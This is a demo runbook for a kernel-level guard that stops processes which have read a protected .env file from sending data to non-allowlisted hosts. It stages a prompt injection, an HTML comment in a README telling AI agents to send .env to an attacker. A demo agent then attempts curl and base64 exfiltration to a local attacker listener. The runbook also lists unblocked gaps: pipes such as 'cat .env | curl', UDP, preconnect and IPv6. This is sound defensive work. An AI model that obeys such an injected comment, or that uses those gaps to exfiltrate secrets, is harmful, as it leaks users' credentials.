# Demo runbook

Owners: Suyash (D + P), Azaan verifies. Copy-paste only: nothing is typed live on stage.

- **Host** = the laptop at `~/projects/syscallguard`. Runs the attacker and the dashboard.
- **VM** = `inno@fed`, repo at `~/syscallguard`. Runs the guard, bridge, internal API and agent.
- VM address: `hostname -I` in the VM (usually `192.168.122.174`). Written `<VM_IP>` below.

## Rules

- **Never edit `demo/project/.env` while the guard runs.** An editor save can give it a new inode and silently end protection. If it happens, restart the whole pipeline.
- **Restarting the guard = restarting the whole `guard.py | bridge.py` pipeline.** The bridge can't reattach to a new guard. Never restart `guard.py` alone.
- Run the agent from a terminal that has **never opened `.env`**. Tags are inherited, so a tagged shell makes every command look blocked.

## Setup (before judges arrive)

**Host, once per boot:**
```bash
sudo firewall-cmd --zone=libvirt --add-port=9999/tcp --add-port=9999/udp
```

**Host, terminal H1 (attacker, keep visible):**
```bash
cd ~/projects/syscallguard && python3 demo/attacker.py --host 0.0.0.0 --port 9999
```

**VM, once per boot:**
```bash
sudo firewall-cmd --add-port=8765/tcp
cd ~/syscallguard
cat policy/policy.toml   # must protect /home/inno/syscallguard/demo/project/.env, allow 127.0.0.0/8 and ::1/128
```

**VM, terminal V1 (guard | bridge pipeline):**
```bash
cd ~/syscallguard && sudo -v
sudo python3 -B guard/guard.py -p policy/policy.toml --mode enforce | python3 bridge/bridge.py --host 0.0.0.0 --port 8765
```
Wait for `guard: INFO ready: mode=enforce` and `WebSocket bridge listening on 0.0.0.0:8765`.

**VM, terminal V2 (stage terminal, fresh):**
```bash
cd ~/syscallguard && bash demo/reset.sh     # starts internal_api.py, checks the hooks are loaded
```

**Host, terminal H2 (dashboard):**
```bash
cd ~/projects/syscallguard/dashboard && SG_BRIDGE_URL=ws://<VM_IP>:8765 npm start
```
Check: both indicators green (bridge reachable, guard feeding), mode `enforce`, the `.env` path in the policy panel.

## The 2-minute script (all in V2 unless noted)

1. **Calm state.** Point at the dashboard: green "Protected", the protected `.env`, the allowlist (loopback only).
2. **The injection.** `cat demo/project/README.md` and point at the HTML comment telling AI agents to send `.env` to the attacker.
3. **Not a firewall: an untagged process gets out.**
   ```bash
   python3 -c "import socket; socket.create_connection(('192.168.122.1',9999)).sendall(b'hello')"
   ```
   H1 prints `TCP got 5 bytes … b'hello'`. The dashboard shows nothing: untagged processes aren't tracked.
4. **The attack.**
   ```bash
   python3 demo/agent.py --mode curl --env demo/project/.env --attacker 192.168.122.1 --port 9999 --api http://127.0.0.1:8080
   ```
   The agent reads `.env` (TAG), its internal API call succeeds (`internal API answered 200`, ALLOW on the dashboard), its curl child inherits the tag, and the exfil fails: `BLOCKED by the guard (curl: Operation not permitted)`. Dashboard banner goes red: blocked, 192.168.122.1:9999. **H1 prints nothing.**
5. **Encoding doesn't help** (if time):
   ```bash
   python3 demo/agent.py --mode b64 --env demo/project/.env --attacker 192.168.122.1 --port 9999 --api http://127.0.0.1:8080
   ```
   `BLOCKED by the guard: [errno 1] Operation not permitted`. H1 silent.
6. **Close on the rule:** a process that read a protected file may only reach allowlisted destinations, enforced in the kernel before a byte leaves.

## Between judges

```bash
bash demo/reset.sh
```
It kills leftover agent/curl processes, restarts the internal API and confirms the hooks are loaded. It leaves the pipeline, attacker and dashboard alone. If it prints `lsm__file_open is not loaded`, restart the V1 pipeline (Ctrl-C, then the same command). If it prints `hook check skipped (sudo would prompt)`, run `sudo -v` once and repeat.

For a cold start: shut down the VM, revert the snapshot, and redo Setup.

## Judge break-it list

Judges may try, in V2:

- `--mode direct`, `--mode curl`, `--mode b64`
- another port: add `--port 4444` (blocked by address, whatever the port)

**Never offer:** pipes (`cat .env | curl …`, a known gap), `--mode udp` or `--mode preconnect` (**not blocked** until hook C lands), native IPv6 (not set up on the VM).

## If something fails on stage

| Symptom | Do this |
|---|---|
| Electron won't start or crashes | Open `dashboard/renderer/index.html?bridge=ws://<VM_IP>:8765` in a browser |
| Dashboard says guard not feeding | Restart the V1 pipeline; the dashboard reconnects in ~2 s |
| Agent's API call fails | `bash demo/reset.sh` (restarts the internal API) |
| Everything shows blocked, even the control | V2 is tagged: open a fresh terminal |
| H1 prints bytes during an agent run | Stop. Say so plainly. Switch to the backup video |
| Guard won't load, VM network down | Play the backup video |

**Backup video:** one clean enforce run (agent direct, then curl, then the dashboard BLOCK, then the empty attacker window). Suyash records, Azaan verifies. Keep it on the host desktop, ready to play.
